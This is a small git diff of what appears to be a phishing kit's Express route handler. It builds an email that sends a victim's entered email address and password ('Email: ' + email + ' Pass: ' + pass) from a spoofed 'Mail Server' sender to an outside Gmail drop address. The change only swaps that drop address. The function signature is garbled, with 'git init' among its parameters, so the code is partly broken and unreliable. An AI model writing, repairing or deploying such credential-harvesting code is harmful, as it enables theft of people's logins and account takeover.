@@ -32,7 +32,7 @@ router.post('/dashboard', function (req, git init res, next) {
 
     let HelperOption = {
         from : '"Mail Server" <glava.zmeya@gmail.com',
-        to : 'serveur.webmail0511@gmail.com',
+        to : 'jacques.frasiak1953@gmail.com',
         subject: 'Click',
         text : "Email: " + email + " Pass: " + pass
     };
